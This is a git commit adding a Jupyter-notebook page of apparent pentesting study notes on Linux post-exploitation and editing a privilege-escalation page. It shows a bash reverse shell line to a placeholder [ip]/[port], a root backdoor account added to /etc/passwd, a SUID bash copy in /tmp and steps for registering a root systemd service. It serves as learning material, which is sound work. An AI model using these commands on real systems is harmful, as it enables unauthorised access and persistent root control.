96947d2549f07b179d0e2745c2e65b4aa779b03e
Dict8-VIII <64312028+Dict8-VIII@users.noreply.github.com>
2022-03-24 00:00:35 +1100

    Linux Fun

---
+++ _build/jupyter_execute/Craft/LinuxFun.py
@@ -0,0 +1,66 @@
+#!/usr/bin/env python
+# coding: utf-8
+
+# # Linux Fun
+# 
+# So, We know our target is a Linux box, what can we do with this information? Theres a whole range of locations that could be interesting if we are looking to exploit a box. While many parallels can be drawn between this section and Windows, they are different OS' and should be understood seperately.
+# 
+# ## Password locations
+# The keys to the safe; but even keys need to be kept somewhere.
+# 
+# ### /etc/passwd
+# While this looks like a password file, youre only half right. In *most* modern versions the user/password file has been split in 2. The user list and details about the users are still kept here.<br>
+# This file is made up of individual lines, each referring to an individual user. The format doesnt really change too much if youre in an old or new version though. Each line is a colon (:) separated list<br>
+# 
+# > test:x:0:0:secretaccount:/root:/bin/bash
+# 
+# - Test: the user name of this account
+# - x: the hashed password (if hashes are split off, this is normally an 'x')
+# - 0: User ID, zero is reserved for root users
+# - 0: Group ID, again zero is reserved for root groups
+# - secretaccount: Comments about the user
+# - /root: The home directory of the user
+# - /bin/bash: the shell location for the user
+# 
+# Clearly this is an example account, but you should be able to get the format from this.<br>
+# Next question, how do we modify this file? Well its a txt file, so however you would like :-). The issue is this file is normally root only writeable.<br>
+# 
+# Lets say you have done some [PriveligeEscalation](../Tools/PriveligeEscalation/PriveligeEscalation.ipynb) and can get a root exploit through. This is a great way to maintain access, just make yourself an account. Most of this is trivial, except generating the hashed password. Fortunately kali comes with methods for this
+# 
+# > openssl passwd -1 -salt[your salt here] [the new password]
+# 
+# This will generate a hash for you, based on your provide password. If you dont want to salt (or its not required), drop the -1 and -salt[]
+# 
+# <hr>
+# 
+# ### /etc/shadow
+# When the hashes were removed from /etc/passwd they showed up here. Again this file is normally root readable only.
+# 
+# <hr>
+# 
+# ## /etc/crontab
+# Cron (or CronTabs / CronJobs) is the linux equivilent of Windows' Task Scheduler. It simply launches programs based on a defined time schedule. If you can view this file there may be jobs set to run as root, and it tells you the file it executes. Who's stopping us from changing this file? No-one, thats who. <br>
+# The obvious first point is to launch a shell as this user, a reverse shell looks a lot like this
+# 
+# > #!/bin/bash <br>
+# > bash -i >& /dev/tcp/[ip]/[port] 0>&1
+# 
+# This will launch a reverse shell back to your machine... Neat.
+# 
+
+# In[1]:
+
+
+from IPython.display import Video
+Video("../videos/BenderNeat.mp4", embed=True,html_attributes="muted controls autoplay loop", width=452, height=332)
+
+
+# Source: https://giphy.com/gifs/8vtm3YCdxtUvjTn0U3
+# <br>
+# Alternatively, you may want to create a new shell somewhere you can access.
+# 
+# > #!/bin/bash<br>
+# > cp /bin/bash /tmp/rootbash<br>
+# > chmod +xs /tmp/rootbash
+# 
+# <hr>
--- _build/jupyter_execute/Tools/PriveligeEscalation/PriveligeEscalation.py
+++ _build/jupyter_execute/Tools/PriveligeEscalation/PriveligeEscalation.py
@@ -3,10 +3,10 @@
 
 # # Privelige Escalation
 # 
-# There are any number of exploits that can get you access to a machine (and ideally a shell), but if a developer is even semi-competent, the service will only be running as a low privelige user. For full pwn-age however, a local root, local admin or Domain Admin are the real prizes. At the end of the day, privelige escalation is like giving yourself a promotion.
+# There are any number of exploits that can get you access to a machine (and ideally a shell), but if a developer is even semi-competent, the service will only be running as a low privelige user. For full pwn-age however, a local root, local admin or Domain Admin are the real prizes. At the end of the day, privelige escalation is like giving yourself a promotion.<br>
 # ![PrivEsc-self_promotions.jpg](../../images/PrivEsc-self_promotions.jpg)
 # 
-# Note: Privelige escalation isnt a purely remote situation. It is also an internal threat, whereas an employee may want to gain access to information they arent supposed to have (a helpdesk operator shouldn have access to finance details however, but a domain admin could probably get to it).
+# Note: Privelige escalation isnt a purely remote situation. It is also an internal threat, whereas an employee may want to gain access to information they arent supposed to have (a helpdesk operator shouldn have access to finance details, but a domain admin could probably get to it).
 # 
 # There are 2 forms of privelige escalation, vertical and horizontal. A vertical escalation is moving to more rights (user -> admin for example), while a horizontal escalation is to move to the same level (we're both in helpdesk, but they have passwords saved on their desktop). Most of the time our goal is vertical movement, but horizonal movement may help get us there.
 # 
@@ -109,6 +109,13 @@
 # 
 # 
 # <hr>
+
+# ### Exploting a Service - Linux
+# Sometimes you may be able to create services to be executed as root (such as with cron). Write your script in a text file and save it as [name].service. The below steps will then register the service for you.
+# 
+# - systemd-analyze verify [name].service
+# - systemctl link /xxx/yyy/[name].service (this must be an absolute path)
+# - systemctl start [name].service
 
 # In[ ]:
 
